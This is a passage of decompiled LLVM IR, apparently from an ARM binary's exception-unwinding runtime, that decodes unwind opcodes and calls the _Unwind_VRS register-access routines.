  %v2_18f1c = inttoptr i32 %v1_18f1c to i8*
  %v3_18f1c = load i8, i8* %v2_18f1c, align 1
  %v4_18f1c = zext i8 %v3_18f1c to i32
  store i32 %v4_18f1c, i32* %r3.global-to-local, align 4
  %v2_18f20 = icmp eq i8 %v3_18f1c, 0
  store i1 %v2_18f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f20, label %dec_label_pc_18f6c, label %dec_label_pc_18f30

dec_label_pc_18f30:                               ; preds = %dec_label_pc_18f1c
  %v1_18f30 = add nsw i32 %v4_18f1c, -1
  store i32 %v1_18f30, i32* %r3.global-to-local, align 4
  %v1_18f34 = trunc i32 %v1_18f30 to i8
  store i8 %v1_18f34, i8* %v2_18f1c, align 1
  %v0_18f38 = load i32, i32* @r5, align 4
  %v1_18f38 = add i32 %v0_18f38, 4
  %v2_18f38 = inttoptr i32 %v1_18f38 to i32*
  %v3_18f38 = load i32, i32* %v2_18f38, align 4
  store i32 %v3_18f38, i32* %r2.global-to-local, align 4
  %v1_18f3c = inttoptr i32 %v3_18f38 to i32*
  %v2_18f3c = load i32, i32* %v1_18f3c, align 4
  store i32 %v2_18f3c, i32* %r0.global-to-local, align 4
  %v4_18f3c = add i32 %v3_18f38, 4
  store i32 %v4_18f3c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18f3c, i32* %v2_18f38, align 4
  %v0_18f48 = load i32, i32* %r3.global-to-local, align 4
  %v1_18f48 = trunc i32 %v0_18f48 to i8
  %v2_18f48 = load i32, i32* @r5, align 4
  %v3_18f48 = add i32 %v2_18f48, 8
  %v4_18f48 = inttoptr i32 %v3_18f48 to i8*
  store i8 %v1_18f48, i8* %v4_18f48, align 1
  %v0_18f4c = load i32, i32* %r0.global-to-local, align 4
  %v1_18f4c = load i32, i32* @r5, align 4
  %v2_18f4c = inttoptr i32 %v1_18f4c to i32*
  store i32 %v0_18f4c, i32* %v2_18f4c, align 4
  br label %dec_label_pc_18f50

dec_label_pc_18f50:                               ; preds = %.thread48, %dec_label_pc_18f30
  %v0_18f50 = load i32, i32* %r0.global-to-local, align 4
  %v3_18f50 = udiv i32 %v0_18f50, 16777216
  %v1_18f54 = urem i32 %v3_18f50, 16
  %v3_18f58 = mul i32 %v0_18f50, 256
  store i32 %v3_18f58, i32* %r0.global-to-local, align 4
  %v1_18f5c = add nuw nsw i32 %v1_18f54, 1
  store i32 %v1_18f5c, i32* %r2.global-to-local, align 4
  %v1_18f60 = and i32 %v3_18f50, 240
  store i32 %v1_18f60, i32* %r3.global-to-local, align 4
  %v1_18f64 = load i32, i32* @r5, align 4
  %v2_18f64 = inttoptr i32 %v1_18f64 to i32*
  store i32 %v3_18f58, i32* %v2_18f64, align 4
  %v0_18f68 = load i32, i32* %r2.global-to-local, align 4
  %v1_18f68 = load i32, i32* %r3.global-to-local, align 4
  %v4_18f68 = mul i32 %v1_18f68, 4096
  %v5_18f68 = or i32 %v4_18f68, %v0_18f68
  br label %dec_label_pc_18f6c

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f1c, %dec_label_pc_18f50
  %storemerge131 = phi i32 [ %v5_18f68, %dec_label_pc_18f50 ], [ 720897, %dec_label_pc_18f1c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18f74:                               ; preds = %dec_label_pc_18d30
  %v0_18f74 = load i32, i32* @r5, align 4
  %v1_18f74 = add i32 %v0_18f74, 8
  %v2_18f74 = inttoptr i32 %v1_18f74 to i8*
  %v3_18f74 = load i8, i8* %v2_18f74, align 1
  %v4_18f74 = zext i8 %v3_18f74 to i32
  store i32 %v4_18f74, i32* %r3.global-to-local, align 4
  %v2_18f78 = icmp eq i8 %v3_18f74, 0
  store i1 %v2_18f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f78, label %dec_label_pc_18f88, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_18f74
  %v2_18f7c = add nsw i32 %v4_18f74, -1
  store i32 %v2_18f7c, i32* %r3.global-to-local, align 4
  %v2_18f80 = trunc i32 %v2_18f7c to i8
  store i8 %v2_18f80, i8* %v2_18f74, align 1
  %v0_18f84.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18f84.pr.pr, label %.thread52.dec_label_pc_18f88_crit_edge, label %dec_label_pc_18fbc

.thread52.dec_label_pc_18f88_crit_edge:           ; preds = %.thread52
  %v0_18f88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18f88

dec_label_pc_18f88:                               ; preds = %.thread52.dec_label_pc_18f88_crit_edge, %dec_label_pc_18f74
  %v2_18fa0 = phi i32 [ %v0_18f88.pre, %.thread52.dec_label_pc_18f88_crit_edge ], [ %v0_18f74, %dec_label_pc_18f74 ]
  %v1_18f88 = add i32 %v2_18fa0, 9
  %v2_18f88 = inttoptr i32 %v1_18f88 to i8*
  %v3_18f88 = load i8, i8* %v2_18f88, align 1
  %v4_18f88 = zext i8 %v3_18f88 to i32
  store i32 %v4_18f88, i32* %r3.global-to-local, align 4
  %v2_18f8c = icmp eq i8 %v3_18f88, 0
  store i1 %v2_18f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18f8c, label %dec_label_pc_18fd8, label %dec_label_pc_18f9c

dec_label_pc_18f9c:                               ; preds = %dec_label_pc_18f88
  %v1_18f9c = add nsw i32 %v4_18f88, -1
  store i32 %v1_18f9c, i32* %r3.global-to-local, align 4
  %v1_18fa0 = trunc i32 %v1_18f9c to i8
  store i8 %v1_18fa0, i8* %v2_18f88, align 1
  %v0_18fa4 = load i32, i32* @r5, align 4
  %v1_18fa4 = add i32 %v0_18fa4, 4
  %v2_18fa4 = inttoptr i32 %v1_18fa4 to i32*
  %v3_18fa4 = load i32, i32* %v2_18fa4, align 4
  store i32 %v3_18fa4, i32* %r2.global-to-local, align 4
  %v1_18fa8 = inttoptr i32 %v3_18fa4 to i32*
  %v2_18fa8 = load i32, i32* %v1_18fa8, align 4
  store i32 %v2_18fa8, i32* %r0.global-to-local, align 4
  %v4_18fa8 = add i32 %v3_18fa4, 4
  store i32 %v4_18fa8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18fa8, i32* %v2_18fa4, align 4
  %v0_18fb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_18fb4 = trunc i32 %v0_18fb4 to i8
  %v2_18fb4 = load i32, i32* @r5, align 4
  %v3_18fb4 = add i32 %v2_18fb4, 8
  %v4_18fb4 = inttoptr i32 %v3_18fb4 to i8*
  store i8 %v1_18fb4, i8* %v4_18fb4, align 1
  %v0_18fb8 = load i32, i32* %r0.global-to-local, align 4
  %v1_18fb8 = load i32, i32* @r5, align 4
  %v2_18fb8 = inttoptr i32 %v1_18fb8 to i32*
  store i32 %v0_18fb8, i32* %v2_18fb8, align 4
  br label %dec_label_pc_18fbc

dec_label_pc_18fbc:                               ; preds = %.thread52, %dec_label_pc_18f9c
  %v0_18fbc = load i32, i32* %r0.global-to-local, align 4
  %v3_18fbc = udiv i32 %v0_18fbc, 16777216
  %v1_18fc0 = urem i32 %v3_18fbc, 16
  %v3_18fc4 = mul i32 %v0_18fbc, 256
  store i32 %v3_18fc4, i32* %r0.global-to-local, align 4
  %v1_18fc8 = add nuw nsw i32 %v1_18fc0, 1
  store i32 %v1_18fc8, i32* %r2.global-to-local, align 4
  %v1_18fcc = and i32 %v3_18fbc, 240
  store i32 %v1_18fcc, i32* %r3.global-to-local, align 4
  %v1_18fd0 = load i32, i32* @r5, align 4
  %v2_18fd0 = inttoptr i32 %v1_18fd0 to i32*
  store i32 %v3_18fc4, i32* %v2_18fd0, align 4
  %v0_18fd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_18fd4 = load i32, i32* %r3.global-to-local, align 4
  %v4_18fd4 = mul i32 %v1_18fd4, 4096
  %v5_18fd4 = or i32 %v4_18fd4, %v0_18fd4
  br label %dec_label_pc_18fd8

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18f88, %dec_label_pc_18fbc
  %storemerge130 = phi i32 [ %v5_18fd4, %dec_label_pc_18fbc ], [ 720897, %dec_label_pc_18f88 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_18fe0:                               ; preds = %dec_label_pc_18d0c
  %v0_18fe0 = load i32, i32* @r5, align 4
  %v1_18fe0 = add i32 %v0_18fe0, 8
  %v2_18fe0 = inttoptr i32 %v1_18fe0 to i8*
  %v3_18fe0 = load i8, i8* %v2_18fe0, align 1
  %v4_18fe0 = zext i8 %v3_18fe0 to i32
  store i32 %v4_18fe0, i32* %r3.global-to-local, align 4
  %v2_18fe4 = icmp eq i8 %v3_18fe0, 0
  store i1 %v2_18fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18fe4, label %dec_label_pc_1918c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18fe0
  %v2_18fe8 = add nsw i32 %v4_18fe0, -1
  store i32 %v2_18fe8, i32* %r3.global-to-local, align 4
  %v2_18fec = trunc i32 %v2_18fe8 to i8
  store i8 %v2_18fec, i8* %v2_18fe0, align 1
  %v0_18ff0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18ff0.pr.pr, label %.thread56.dec_label_pc_1918c_crit_edge, label %dec_label_pc_18ff4

.thread56.dec_label_pc_1918c_crit_edge:           ; preds = %.thread56
  %v0_1918c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1918c

dec_label_pc_18ff4:                               ; preds = %.thread56, %dec_label_pc_19198
  %v0_18ff4 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ff4 = udiv i32 %v0_18ff4, 16777216
  store i32 %v3_18ff4, i32* %r3.global-to-local, align 4
  store i32 %v3_18ff4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18ff4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_18ffc = mul i32 %v0_18ff4, 256
  store i32 %v3_18ffc, i32* %r0.global-to-local, align 4
  %v1_19000 = load i32, i32* @r5, align 4
  %v2_19000 = inttoptr i32 %v1_19000 to i32*
  store i32 %v3_18ffc, i32* %v2_19000, align 4
  br i1 %tmp184, label %dec_label_pc_18dbc, label %dec_label_pc_19008

dec_label_pc_19008:                               ; preds = %dec_label_pc_18ff4
  %v0_19008 = load i32, i32* %r3.global-to-local, align 4
  %v1_19008 = and i32 %v0_19008, 240
  store i32 %v1_19008, i32* %r3.global-to-local, align 4
  %v2_19008 = icmp eq i32 %v1_19008, 0
  store i1 %v2_19008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19008, label %dec_label_pc_19010, label %dec_label_pc_18dbc

dec_label_pc_19010:                               ; preds = %dec_label_pc_19008
  %v0_19010 = load i32, i32* @r7, align 4
  store i32 %v0_19010, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_19018 = load i32, i32* %r2.global-to-local, align 4
  %v4_19018 = call i32 @_Unwind_VRS_Pop(i32 %v0_19010, i32 4, i32 %v2_19018, i32 0)
  store i32 %v4_19018, i32* %r0.global-to-local, align 4
  %v2_1901c = icmp eq i32 %v4_19018, 0
  store i1 %v2_1901c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1901c, label %dec_label_pc_18aec.backedge, label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_19010
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_1902c:                               ; preds = %dec_label_pc_18e58
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19038 = load i32, i32* @r7, align 4
  store i32 %v0_19038, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_19044 = call i32 @_Unwind_VRS_Get(i32 %v0_19038, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19044, i32* %r0.global-to-local, align 4
  %v0_19048 = load i32, i32* @r5, align 4
  %v1_19048 = add i32 %v0_19048, 8
  %v2_19048 = inttoptr i32 %v1_19048 to i8*
  %v3_19048 = load i8, i8* %v2_19048, align 1
  %v4_19048 = zext i8 %v3_19048 to i32
  store i32 %v4_19048, i32* %r1.global-to-local, align 4
  %v2_1904c = icmp eq i8 %v3_19048, 0
  store i1 %v2_1904c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1904c, label %dec_label_pc_1905c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1902c
  %v2_19050 = add nsw i32 %v4_19048, -1
  store i32 %v2_19050, i32* %r3.global-to-local, align 4
  %v2_19054 = trunc i32 %v2_19050 to i8
  store i8 %v2_19054, i8* %v2_19048, align 1
  %v0_19058.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19058.pr.pr, label %.thread58.dec_label_pc_1905c_crit_edge, label %dec_label_pc_19088

.thread58.dec_label_pc_1905c_crit_edge:           ; preds = %.thread58
  %v0_1905c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1905c

dec_label_pc_1905c:                               ; preds = %.thread58.dec_label_pc_1905c_crit_edge, %dec_label_pc_1902c
  %v2_19070 = phi i32 [ %v0_1905c.pre, %.thread58.dec_label_pc_1905c_crit_edge ], [ %v0_19048, %dec_label_pc_1902c ]
  %v1_1905c = add i32 %v2_19070, 9
  %v2_1905c = inttoptr i32 %v1_1905c to i8*
  %v3_1905c = load i8, i8* %v2_1905c, align 1
  %v4_1905c = zext i8 %v3_1905c to i32
  store i32 %v4_1905c, i32* %r3.global-to-local, align 4
  %v2_19060 = icmp eq i8 %v3_1905c, 0
  store i1 %v2_19060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19060, label %bb158, label %dec_label_pc_1906c

bb158:                                            ; preds = %dec_label_pc_1905c
  %v1_19064 = load i32, i32* @r6, align 4
  store i32 %v1_19064, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_190b0

dec_label_pc_1906c:                               ; preds = %dec_label_pc_1905c
  %v1_1906c = add nsw i32 %v4_1905c, -1
  store i32 %v1_1906c, i32* %r3.global-to-local, align 4
  %v1_19070 = trunc i32 %v1_1906c to i8
  store i8 %v1_19070, i8* %v2_1905c, align 1
  %v0_19074 = load i32, i32* @r5, align 4
  %v1_19074 = add i32 %v0_19074, 4
  %v2_19074 = inttoptr i32 %v1_19074 to i32*
  %v3_19074 = load i32, i32* %v2_19074, align 4
  store i32 %v3_19074, i32* %r2.global-to-local, align 4
  %v1_19078 = inttoptr i32 %v3_19074 to i32*
  %v2_19078 = load i32, i32* %v1_19078, align 4
  store i32 %v2_19078, i32* %r0.global-to-local, align 4
  %v4_19078 = add i32 %v3_19074, 4
  store i32 %v4_19078, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_19080 = inttoptr i32 %v0_19074 to i32*
  store i32 %v2_19078, i32* %v1_19080, align 4
  %v5_19080 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19080, i32* %v2_19074, align 4
  %v0_19084 = load i32, i32* %r3.global-to-local, align 4
  %v1_19084 = trunc i32 %v0_19084 to i8
  %v2_19084 = load i32, i32* @r5, align 4
  %v3_19084 = add i32 %v2_19084, 8
  %v4_19084 = inttoptr i32 %v3_19084 to i8*
  store i8 %v1_19084, i8* %v4_19084, align 1
  br label %dec_label_pc_19088

dec_label_pc_19088:                               ; preds = %.thread58, %dec_label_pc_1906c
  %v0_19088 = load i32, i32* @r5, align 4
  %v1_19088 = inttoptr i32 %v0_19088 to i32*
  %v2_19088 = load i32, i32* %v1_19088, align 4
  store i32 %v2_19088, i32* %r3.global-to-local, align 4
  %v3_1908c = mul i32 %v2_19088, 256
  store i32 %v3_1908c, i32* %r0.global-to-local, align 4
  %v3_19090 = udiv i32 %v2_19088, 16777216
  store i32 %v3_19090, i32* %r2.global-to-local, align 4
  store i32 %v3_1908c, i32* %v1_19088, align 4
  %v0_19098 = load i32, i32* %r2.global-to-local, align 4
  %v1_19098 = and i32 %v0_19098, 128
  %v2_19098 = icmp eq i32 %v1_19098, 0
  store i1 %v2_19098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19098, label %.thread129, label %dec_label_pc_190ac

.thread129:                                       ; preds = %dec_label_pc_19088
  %v4_1909c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1909c, i32* %ip.global-to-local, align 4
  %v1_190a0 = urem i32 %v0_19098, 256
  store i32 %v1_190a0, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_19120

dec_label_pc_190ac:                               ; preds = %dec_label_pc_19088
  %v1_190a063 = urem i32 %v0_19098, 256
  store i32 %v1_190a063, i32* %r2.global-to-local, align 4
  %v0_190ac = load i32, i32* @r5, align 4
  %v1_190ac = add i32 %v0_190ac, 8
  %v2_190ac = inttoptr i32 %v1_190ac to i8*
  %v3_190ac = load i8, i8* %v2_190ac, align 1
  %v4_190ac = zext i8 %v3_190ac to i32
  store i32 %v4_190ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_190b0

dec_label_pc_190b0:                               ; preds = %bb158, %dec_label_pc_190ac
  %v3_190d099 = phi i32 [ %v2_19070, %bb158 ], [ %v0_190ac, %dec_label_pc_190ac ]
  %v0_190b892 = phi i32 [ %v1_19064, %bb158 ], [ %v1_190a063, %dec_label_pc_190ac ]
  %v3_190b0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_190b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_190b8

dec_label_pc_190b8:                               ; preds = %dec_label_pc_190b8.backedge, %dec_label_pc_190b0
  %v3_190d0 = phi i32 [ %v3_190d0100, %dec_label_pc_190b8.backedge ], [ %v3_190d099, %dec_label_pc_190b0 ]
  %v0_190cc = phi i32 [ %v2_190bc.pre, %dec_label_pc_190b8.backedge ], [ 2, %dec_label_pc_190b0 ]
  %v0_190bc = phi i32 [ %v0_190bc.pre, %dec_label_pc_190b8.backedge ], [ %v3_190b0, %dec_label_pc_190b0 ]
  %v0_190b8 = phi i32 [ %v0_190b895, %dec_label_pc_190b8.backedge ], [ %v0_190b892, %dec_label_pc_190b0 ]
  %v1_190b8 = urem i32 %v0_190b8, 128
  %v7_190bc = shl i32 %v1_190b8, %v0_190cc
  %v8_190bc = add i32 %v7_190bc, %v0_190bc
  store i32 %v8_190bc, i32* %ip.global-to-local, align 4
  %v0_190c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_190c0 = icmp eq i32 %v0_190c0, 0
  store i1 %v2_190c0, i1* %cpsr_z.global-to-local, align 1
  %v1_190c4 = add i32 %v0_190c0, -1
  store i32 %v1_190c4, i32* %r3.global-to-local, align 4
  store i32 %v8_190bc, i32* %stack_var_-36, align 4
  %v1_190cc = add i32 %v0_190cc, 7
  store i32 %v1_190cc, i32* @lr, align 4
  br i1 %v2_190c0, label %dec_label_pc_190d8, label %bb159

bb159:                                            ; preds = %dec_label_pc_190b8
  %v2_190d0 = trunc i32 %v1_190c4 to i8
  %v4_190d0 = add i32 %v3_190d0, 8
  %v5_190d0 = inttoptr i32 %v4_190d0 to i8*
  store i8 %v2_190d0, i8* %v5_190d0, align 1
  %v0_190d4.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_190d4.pr, label %.dec_label_pc_190d8_crit_edge, label %dec_label_pc_19104

.dec_label_pc_190d8_crit_edge:                    ; preds = %bb159
  %v0_190d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_190d8

dec_label_pc_190d8:                               ; preds = %.dec_label_pc_190d8_crit_edge, %dec_label_pc_190b8
  %v2_190f0 = phi i32 [ %v0_190d8.pre, %.dec_label_pc_190d8_crit_edge ], [ %v3_190d0, %dec_label_pc_190b8 ]
  %v1_190d8 = add i32 %v2_190f0, 9
  %v2_190d8 = inttoptr i32 %v1_190d8 to i8*
  %v3_190d8 = load i8, i8* %v2_190d8, align 1
  %v4_190d8 = zext i8 %v3_190d8 to i32
  store i32 %v4_190d8, i32* %r3.global-to-local, align 4
  %v2_190dc = icmp eq i8 %v3_190d8, 0
  store i1 %v2_190dc, i1* %cpsr_z.global-to-local, align 1
  %v1_190e0 = add nsw i32 %v4_190d8, -1
  store i32 %v1_190e0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_190dc, label %dec_label_pc_190b8.backedge, label %dec_label_pc_190ec

dec_label_pc_190ec:                               ; preds = %dec_label_pc_190d8
  %v1_190ec = add i32 %v2_190f0, 4
  %v2_190ec = inttoptr i32 %v1_190ec to i32*
  %v3_190ec = load i32, i32* %v2_190ec, align 4
  store i32 %v3_190ec, i32* %r2.global-to-local, align 4
  %v1_190f0 = trunc i32 %v1_190e0 to i8
  store i8 %v1_190f0, i8* %v2_190d8, align 1
  %v0_190f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_190f4 = inttoptr i32 %v0_190f4 to i32*
  %v2_190f4 = load i32, i32* %v1_190f4, align 4
  store i32 %v2_190f4, i32* %r0.global-to-local, align 4
  %v4_190f4 = add i32 %v0_190f4, 4
  store i32 %v4_190f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_190fc = load i32, i32* @r5, align 4
  %v3_190fc = add i32 %v2_190fc, 8
  %v4_190fc = inttoptr i32 %v3_190fc to i8*
  store i8 3, i8* %v4_190fc, align 1
  %v0_19100 = load i32, i32* @r5, align 4
  %v1_19100 = inttoptr i32 %v0_19100 to i32*
  %v2_19100 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_19100, i32* %v1_19100, align 4
  %v3_19100 = add i32 %v0_19100, 4
  %v4_19100 = inttoptr i32 %v3_19100 to i32*
  %v5_19100 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_19100, i32* %v4_19100, align 4
  br label %dec_label_pc_19104

dec_label_pc_19104:                               ; preds = %bb159, %dec_label_pc_190ec
  %v0_19104 = load i32, i32* @r5, align 4
  %v1_19104 = inttoptr i32 %v0_19104 to i32*
  %v2_19104 = load i32, i32* %v1_19104, align 4
  store i32 %v2_19104, i32* %r3.global-to-local, align 4
  %v3_19108 = udiv i32 %v2_19104, 16777216
  store i32 %v3_19108, i32* %r2.global-to-local, align 4
  %v1_1910c = and i32 %v3_19108, 128
  %v2_1910c = icmp eq i32 %v1_1910c, 0
  store i1 %v2_1910c, i1* %cpsr_z.global-to-local, align 1
  %v3_19110 = mul i32 %v2_19104, 256
  store i32 %v3_19110, i32* %r0.global-to-local, align 4
  store i32 %v3_19110, i32* %v1_19104, align 4
  %v0_19118 = load i32, i32* %r2.global-to-local, align 4
  %v1_19118 = urem i32 %v0_19118, 256
  store i32 %v1_19118, i32* %r2.global-to-local, align 4
  br i1 %v2_1910c, label %dec_label_pc_19120.loopexit, label %dec_label_pc_1914c

dec_label_pc_19120.loopexit:                      ; preds = %dec_label_pc_19104
  %v0_19124.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_19128.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19120

dec_label_pc_19120:                               ; preds = %dec_label_pc_19120.loopexit, %.thread129
  %v2_19128 = phi i32 [ 2, %.thread129 ], [ %v2_19128.pre, %dec_label_pc_19120.loopexit ]
  %v0_19124 = phi i32 [ %v4_1909c, %.thread129 ], [ %v0_19124.pre, %dec_label_pc_19120.loopexit ]
  %v0_19120 = phi i32 [ %v1_190a0, %.thread129 ], [ %v1_19118, %dec_label_pc_19120.loopexit ]
  %v1_19120 = urem i32 %v0_19120, 128
  %v1_19124 = add i32 %v0_19124, 516
  %v7_19128 = shl i32 %v1_19120, %v2_19128
  %v8_19128 = add i32 %v1_19124, %v7_19128
  store i32 %v8_19128, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19130 = load i32, i32* @r7, align 4
  store i32 %v0_19130, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_19128, i32* %stack_var_-36, align 4
  %v5_19144 = call i32 @_Unwind_VRS_Set(i32 %v0_19130, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19144, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18aec.backedge

dec_label_pc_1914c:                               ; preds = %dec_label_pc_19104
  %v0_1914c = load i32, i32* @r5, align 4
  %v1_1914c = add i32 %v0_1914c, 8
  %v2_1914c = inttoptr i32 %v1_1914c to i8*
  %v3_1914c = load i8, i8* %v2_1914c, align 1
  %v4_1914c = zext i8 %v3_1914c to i32
  store i32 %v4_1914c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_190b8.backedge

dec_label_pc_190b8.backedge:                      ; preds = %dec_label_pc_1914c, %dec_label_pc_190d8
  %v3_190d0100 = phi i32 [ %v0_1914c, %dec_label_pc_1914c ], [ %v2_190f0, %dec_label_pc_190d8 ]
  %v0_190b895 = phi i32 [ %v1_19118, %dec_label_pc_1914c ], [ 176, %dec_label_pc_190d8 ]
  %v0_190bc.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_190bc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_190b8

dec_label_pc_19154:                               ; preds = %dec_label_pc_18e50
  %v0_19154 = load i32, i32* @r5, align 4
  %v1_19154 = add i32 %v0_19154, 8
  %v2_19154 = inttoptr i32 %v1_19154 to i8*
  %v3_19154 = load i8, i8* %v2_19154, align 1
  %v4_19154 = zext i8 %v3_19154 to i32
  store i32 %v4_19154, i32* %r3.global-to-local, align 4
  %v2_19158 = icmp eq i8 %v3_19154, 0
  store i1 %v2_19158, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19158, label %dec_label_pc_191bc, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_19154
  %v2_1915c = add nsw i32 %v4_19154, -1
  store i32 %v2_1915c, i32* %r3.global-to-local, align 4
  %v2_19160 = trunc i32 %v2_1915c to i8
  store i8 %v2_19160, i8* %v2_19154, align 1
  %v0_19164.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19164.pr.pr, label %.thread66.dec_label_pc_191bc_crit_edge, label %dec_label_pc_19168

.thread66.dec_label_pc_191bc_crit_edge:           ; preds = %.thread66
  %v0_191bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_191bc

dec_label_pc_19168:                               ; preds = %.thread66, %dec_label_pc_191c8
  %v0_19168 = load i32, i32* %r0.global-to-local, align 4
  %v3_19168 = udiv i32 %v0_19168, 16777216
  store i32 %v3_19168, i32* %r3.global-to-local, align 4
  store i32 %v3_19168, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_19168, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_19170 = mul i32 %v0_19168, 256
  store i32 %v3_19170, i32* %r0.global-to-local, align 4
  %v1_19174 = load i32, i32* @r5, align 4
  %v2_19174 = inttoptr i32 %v1_19174 to i32*
  store i32 %v3_19170, i32* %v2_19174, align 4
  br i1 %tmp185, label %dec_label_pc_18dbc, label %dec_label_pc_1917c

dec_label_pc_1917c:                               ; preds = %dec_label_pc_19168
  %v0_1917c = load i32, i32* %r3.global-to-local, align 4
  %v1_1917c = and i32 %v0_1917c, 240
  store i32 %v1_1917c, i32* %r1.global-to-local, align 4
  %v2_1917c = icmp eq i32 %v1_1917c, 0
  store i1 %v2_1917c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1917c, label %dec_label_pc_1917c.dec_label_pc_18dec_crit_edge, label %dec_label_pc_19184

dec_label_pc_1917c.dec_label_pc_18dec_crit_edge:  ; preds = %dec_label_pc_1917c
  %v2_18df4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18dec

dec_label_pc_19184:                               ; preds = %dec_label_pc_1917c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18c14

dec_label_pc_1918c:                               ; preds = %.thread56.dec_label_pc_1918c_crit_edge, %dec_label_pc_18fe0
  %v2_1919c = phi i32 [ %v0_1918c.pre, %.thread56.dec_label_pc_1918c_crit_edge ], [ %v0_18fe0, %dec_label_pc_18fe0 ]
  %v1_1918c = add i32 %v2_1919c, 9
  %v2_1918c = inttoptr i32 %v1_1918c to i8*
  %v3_1918c = load i8, i8* %v2_1918c, align 1
  %v4_1918c = zext i8 %v3_1918c to i32
  store i32 %v4_1918c, i32* %r3.global-to-local, align 4
  %v2_19190 = icmp eq i8 %v3_1918c, 0
  store i1 %v2_19190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19190, label %dec_label_pc_18dbc, label %dec_label_pc_19198

dec_label_pc_19198:                               ; preds = %dec_label_pc_1918c
  %v1_19198 = add nsw i32 %v4_1918c, -1
  store i32 %v1_19198, i32* %r3.global-to-local, align 4
  %v1_1919c = trunc i32 %v1_19198 to i8
  store i8 %v1_1919c, i8* %v2_1918c, align 1
  %v0_191a0 = load i32, i32* @r5, align 4
  %v1_191a0 = add i32 %v0_191a0, 4
  %v2_191a0 = inttoptr i32 %v1_191a0 to i32*
  %v3_191a0 = load i32, i32* %v2_191a0, align 4
  store i32 %v3_191a0, i32* %r2.global-to-local, align 4
  %v1_191a4 = inttoptr i32 %v3_191a0 to i32*
  %v2_191a4 = load i32, i32* %v1_191a4, align 4
  store i32 %v2_191a4, i32* %r0.global-to-local, align 4
  %v4_191a4 = add i32 %v3_191a0, 4
